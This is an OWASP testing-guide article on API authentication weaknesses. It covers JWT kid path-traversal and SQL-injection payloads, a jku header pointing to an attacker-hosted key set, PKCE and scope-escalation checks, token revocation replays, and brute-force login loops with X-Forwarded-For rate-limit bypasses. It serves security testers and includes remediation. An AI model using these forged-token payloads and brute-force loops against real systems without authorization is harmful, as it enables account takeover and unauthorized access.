# Testing API Authentication Mechanisms

|ID          |
|------------|
|WSTG-APIT-05|

## Summary

APIs rely on stateless authentication mechanisms—JSON Web Tokens (JWT), OAuth 2.0 flows, API keys, and bearer tokens—to verify callers before granting access. Each mechanism introduces API-specific weaknesses that differ from traditional session-based web application authentication. An API key transmitted in a URL query string leaks into server logs and proxy caches. A bearer token that is never revoked allows indefinite access after credential compromise. An OAuth flow missing PKCE enforcement exposes public clients to authorization code interception.

This article covers testing procedures for authentication weaknesses specific to API contexts. For general authentication mechanism testing, see [section 4.4](../04-Authentication/README.md). For JWT structure, signature, and claim validation testing, see [4.6.10 Testing JSON Web Tokens](../06-Session_Management/10-JSON_Web_Tokens.md). For OAuth 2.0 flow weaknesses including `state` parameter validation and `redirect_uri` manipulation, see [4.5.5 Testing for OAuth Weaknesses](../05-Authorization/05-OAuth_Weaknesses.md). For MFA bypass testing, see [4.4.11 Testing Multi-Factor Authentication](../04-Authentication/11-Multi-Factor_Authentication.md).

## Test Objectives

- Assess whether API keys are scoped, rotated, and transmitted securely.
- Determine whether bearer tokens expire, are revocable, and cannot be reused after logout or credential change.
- Verify that OAuth 2.0 implementations enforce PKCE for public clients and restrict token scope to what was authorized.
- Evaluate stateless authentication enforcement, ensuring APIs do not fall back to session cookies.
- Confirm that authentication endpoints enforce rate limiting.
- Test for authentication bypass via HTTP method switching.
- Verify that JWT `kid`, `jku`, and `x5u` header parameters are validated against strict allowlists.

## How to Test

### Related Testing

Before running the API-specific tests below, confirm that the target has been tested for general authentication weaknesses:

- [4.6.10 Testing JSON Web Tokens](../06-Session_Management/10-JSON_Web_Tokens.md) covers `none` algorithm attacks, algorithm confusion (RS256→HS256), expired token acceptance, and claim tampering.
- [4.5.5 Testing for OAuth Weaknesses](../05-Authorization/05-OAuth_Weaknesses.md) covers missing `state` parameter, `redirect_uri` manipulation, and authorization server misconfigurations.
- [4.4.11 Testing Multi-Factor Authentication](../04-Authentication/11-Multi-Factor_Authentication.md) covers MFA bypass techniques.

The tests in this article focus on API-specific scenarios not covered by the above.

### Test JWT Header Parameter Injection

JWT headers can include parameters (`kid`, `jku`, `x5u`) that direct the server to a specific key or key source. When APIs expose JWKS endpoints, these parameters become attack vectors for key injection.

#### 1. Key ID (kid) Injection

The `kid` header parameter tells the server which key to use for verification. If the server uses `kid` in a file path lookup or database query without sanitization, injection is possible.

Test with a path traversal payload:

```json
{
  "alg": "HS256",
  "kid": "../../../dev/null",
  "typ": "JWT"
}
```

Sign the token with an empty string as the secret (the contents of `/dev/null`). Send the forged token:

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <forged-token>" \
  https://api.example.com/v1/admin/users
```

Insecure behavior: the server accepts the token. The `kid` parameter is vulnerable to path traversal.

Test with a SQL injection payload:

```json
{
  "kid": "key1' UNION SELECT 'attacker-controlled-secret' -- ",
  "alg": "HS256"
}
```

Sign the token with `attacker-controlled-secret` as the HMAC key and verify acceptance.

#### 2. JKU and X5U Header Manipulation

The `jku` (JWK Set URL) and `x5u` (X.509 URL) header parameters tell the server where to fetch the signing key. If the server follows these URLs without allowlist validation, point them to an attacker-controlled server:

```json
{
  "alg": "RS256",
  "jku": "https://attacker.example.com/.well-known/jwks.json"
}
```

Host a JWKS at that URL containing your public key. Sign the token with your private key.

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <forged-token>" \
  https://api.example.com/v1/admin/users
```

Insecure behavior: the server fetches and trusts the attacker-hosted key, accepting the forged token.

### Test OAuth 2.0 in API Context

The following tests cover OAuth weaknesses specific to API consumers (native apps, SPAs, machine-to-machine clients). For general OAuth flow testing, see [4.5.5](../05-Authorization/05-OAuth_Weaknesses.md).

#### 1. PKCE Bypass

If the authorization server advertises PKCE support, test whether it enforces it:

1. Initiate an authorization request without `code_challenge`:

   ```text
   GET /authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://app.example.com/callback HTTP/1.1
   Host: auth.example.com
   ```

2. Exchange the authorization code without `code_verifier`:

   ```bash
   curl -X POST https://auth.example.com/token \
     -d "grant_type=authorization_code" \
     -d "code=AUTH_CODE" \
     -d "client_id=CLIENT_ID" \
     -d "redirect_uri=https://app.example.com/callback"
   ```

Insecure behavior: the server issues an access token without verifying PKCE parameters. Public clients (SPAs, mobile apps) are then vulnerable to authorization code interception.

#### 2. Scope Escalation

Request a token with minimal scope, then attempt to access resources requiring higher privileges:

```bash
# Request token with read-only scope
curl -X POST https://auth.example.com/token \
  -d "grant_type=client_credentials" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "scope=read"

# Attempt a write operation with the read-only token
curl -X DELETE \
  -H "Authorization: Bearer <read-only-token>" \
  https://api.example.com/v1/users/123
```

Also test whether the token endpoint allows requesting a broader scope than originally authorized:

```bash
curl -X POST https://auth.example.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "scope=read write admin"
```

Insecure behavior: the server grants a token with broader scope than authorized, or the API does not enforce scope restrictions on resource access.

#### 3. Token Leakage via Referer Header

For implicit flow (`response_type=token`), observe whether the access token appears in the URL fragment after redirect:

```text
https://app.example.com/callback#access_token=eyJ...&token_type=bearer
```

Check the `Referer` header on subsequent requests from the callback page. If the page loads external resources (analytics scripts, images), the token in the fragment may leak through the `Referer` header. Also check browser history and server access logs.

### Test API Key Security

API keys are the primary credential type for machine-to-machine API access. Unlike session tokens, they are often long-lived and not bound to a user session.

#### 1. Key Transmission

Inspect whether the API key is sent in the URL query string or in a header:

```bash
# Insecure: key in URL (logged by proxies, servers, CDNs)
curl "https://api.example.com/v1/data?api_key=sk_live_abc123"

# Secure: key in header
curl -H "X-API-Key: sk_live_abc123" https://api.example.com/v1/data
```

Check server access logs, proxy logs, and browser history for the key value when sent as a query parameter.

#### 2. Key Scoping

Test whether a key issued for one service or environment works on another:

```bash
# Use a staging key against production
curl -H "X-API-Key: sk_staging_abc123" https://api.example.com/v1/data

# Use a read-only key for write operations
curl -X POST \
  -H "X-API-Key: sk_readonly_abc123" \
  -H "Content-Type: application/json" \
  -d '{"name": "test"}' \
  https://api.example.com/v1/resources
```

Insecure behavior: the key is accepted outside its intended scope.

#### 3. Key Rotation and Revocation

Obtain a new API key through the key management interface. Test whether the old key still works:

```bash
curl -H "X-API-Key: <old-key>" https://api.example.com/v1/data
```

Insecure behavior: the old key remains valid indefinitely after rotation.

Also test revocation propagation delay: after revoking a key, send requests at intervals (immediately, 30 seconds, 1 minute, 5 minutes) to determine how long the revoked key remains active. Caching layers or distributed systems may introduce significant delays.

#### 4. Key Exposure in Client-Side Code

Search for API keys in:

- JavaScript source files and source maps
- Mobile application packages (APK/IPA)
- Public repositories (GitHub, GitLab)
- Browser developer tools (network tab, local storage)

```bash
# Search JavaScript files for key patterns
curl -s https://app.example.com/static/js/main.js | grep -iE '(api[_-]?key|apikey|x-api-key)\s*[:=]\s*["\x27]'
```

### Test Bearer Token Lifecycle

#### 1. Token Lifetime

Decode the token (if JWT) or observe the `expires_in` field in the token response. Assess whether the lifetime is appropriate:

- Access tokens longer than 1 hour increase the window for stolen token abuse.
- Refresh tokens without expiry allow indefinite access.

#### 2. Token Revocation

Authenticate, obtain a token, then log out or revoke the token. Replay the revoked token:

```bash
# Log out / revoke
curl -X POST https://api.example.com/v1/auth/logout \
  -H "Authorization: Bearer <token>"

# Replay the revoked token
curl -H "Authorization: Bearer <token>" \
  https://api.example.com/v1/profile
```

Insecure behavior: the revoked token still grants access.

#### 3. Token Reuse After Password Change

Change the user's password, then replay a token issued before the password change:

```bash
# Change password
curl -X POST https://api.example.com/v1/auth/change-password \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"old_password": "old", "new_password": "new"}'

# Replay the pre-change token
curl -H "Authorization: Bearer <token>" \
  https://api.example.com/v1/profile
```

Insecure behavior: the old token continues to work after a password change.

#### 4. Refresh Token Rotation

If the API uses refresh tokens, test whether the server enforces rotation:

```bash
# Use refresh token to obtain new access token
curl -X POST https://auth.example.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=REFRESH_TOKEN" \
  -d "client_id=CLIENT_ID"

# Replay the same refresh token
curl -X POST https://auth.example.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=REFRESH_TOKEN" \
  -d "client_id=CLIENT_ID"
```

Insecure behavior: the server accepts the reused refresh token instead of rejecting it and revoking the token family.

### Test Stateless Authentication Enforcement

APIs should rely on stateless authentication (tokens in headers) rather than session cookies. Mixed authentication can introduce session-based vulnerabilities in an otherwise stateless API.

#### 1. Session Cookie Fallback

Send a request without a bearer token but with a session cookie obtained from a browser login:

```bash
# Authenticate via browser and capture session cookie
# Then use only the cookie against the API
curl -H "Cookie: session=abc123" \
  https://api.example.com/v1/profile
```

Insecure behavior: the API accepts session cookie authentication, making it vulnerable to CSRF attacks that token-based auth would prevent.

#### 2. Authentication Bypass via HTTP Method Switching

Test whether authentication enforcement varies by HTTP method on the same endpoint:

```bash
# Authenticated request (baseline)
curl -X GET -H "Authorization: Bearer <token>" \
  https://api.example.com/v1/users/123

# Same endpoint, different method, no auth
curl -X POST https://api.example.com/v1/users/123
curl -X PUT https://api.example.com/v1/users/123
curl -X PATCH https://api.example.com/v1/users/123
curl -X DELETE https://api.example.com/v1/users/123
curl -X OPTIONS https://api.example.com/v1/users/123
```

Insecure behavior: one or more methods bypass authentication. This occurs when authentication middleware is registered only for specific HTTP methods.

#### 3. Token Replay Across Sessions

Obtain two tokens for different users. Send User A's token in User B's session context (different IP, different `User-Agent`):

```bash
curl -H "Authorization: Bearer <user-a-token>" \
  -H "User-Agent: DifferentBrowser/1.0" \
  https://api.example.com/v1/profile
```

Check whether the server binds tokens to any client fingerprint. Note that IP binding is not always practical for mobile clients, but the server should at minimum detect and log token use from unexpected origins.

### Test Rate Limiting on Authentication Endpoints

Authentication endpoints without rate limiting allow credential stuffing and brute-force attacks.

#### 1. Login Endpoint Rate Limiting

Send repeated authentication requests with invalid credentials:

```bash
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://api.example.com/v1/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": \"attempt$i\"}"
done
```

Insecure behavior: all 50 requests return the same response code (e.g., `401`) with no `429 Too Many Requests` or account lockout.

#### 2. Token Endpoint Rate Limiting

Test whether the OAuth token endpoint rate-limits failed client credential or authorization code exchanges:

```bash
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://auth.example.com/token \
    -d "grant_type=client_credentials" \
    -d "client_id=CLIENT_ID" \
    -d "client_secret=wrong_secret_$i"
done
```

#### 3. Rate Limit Bypass Techniques

Test common bypass methods:

```bash
# IP rotation via headers
curl -H "X-Forwarded-For: 1.2.3.4" \
  -X POST https://api.example.com/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "test"}'

# Case variation in username
curl -X POST https://api.example.com/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "Admin", "password": "test"}'

# Unicode normalization
curl -X POST https://api.example.com/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\u0000", "password": "test"}'
```

## Remediation

- Validate JWT `kid` parameters against a strict allowlist. Never use `kid` in file path lookups or database queries without sanitization.
- Validate `jku` and `x5u` headers against a strict allowlist of trusted URLs. Prefer local key storage over remote key fetching.
- Require PKCE for all public clients and enforce `code_verifier` validation at the token endpoint.
- Enforce token scope at the resource server. Reject token requests that exceed the authorized scope.
- Transmit API keys in headers, not URL parameters. Scope keys to specific services and environments. Implement automatic key rotation with immediate revocation of old keys.
- Set appropriate token lifetimes. Invalidate all tokens on logout, password change, and privilege change. Implement refresh token rotation with token family revocation on reuse detection.
- Enforce stateless authentication consistently across all API endpoints and HTTP methods. Do not fall back to session cookie authentication.
- Implement rate limiting on all authentication endpoints with account lockout after repeated failures. Validate rate limiting cannot be bypassed via header injection or input variation.
- Pin the expected algorithm on the server-side rather than reading it from the token header. For additional JWT and OAuth hardening, see [4.6.10](../06-Session_Management/10-JSON_Web_Tokens.md) and [4.5.5](../05-Authorization/05-OAuth_Weaknesses.md).

## References

- [OWASP Testing Guide: Testing for Credentials Transported over an Encrypted Channel](../04-Authentication/01-Credentials_Transported_over_an_Encrypted_Channel.md)
- [OWASP Testing Guide: Testing for Weak Lock Out Mechanism](../04-Authentication/03-Weak_Lock_Out_Mechanism.md)
- [OWASP Testing Guide: Testing JSON Web Tokens](../06-Session_Management/10-JSON_Web_Tokens.md)
- [OWASP Testing Guide: Testing for OAuth Weaknesses](../05-Authorization/05-OAuth_Weaknesses.md)
- [OWASP Testing Guide: Testing Multi-Factor Authentication](../04-Authentication/11-Multi-Factor_Authentication.md)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html)
- [OWASP OAuth2 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)
- [RFC 7519: JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 7636: Proof Key for Code Exchange (PKCE)](https://datatracker.ietf.org/doc/html/rfc7636)
- [RFC 6749: The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [CWE-294: Authentication Bypass by Capture-replay](https://cwe.mitre.org/data/definitions/294.html)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
- [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
- [CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)
- [CWE-613: Insufficient Session Expiration](https://cwe.mitre.org/data/definitions/613.html)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
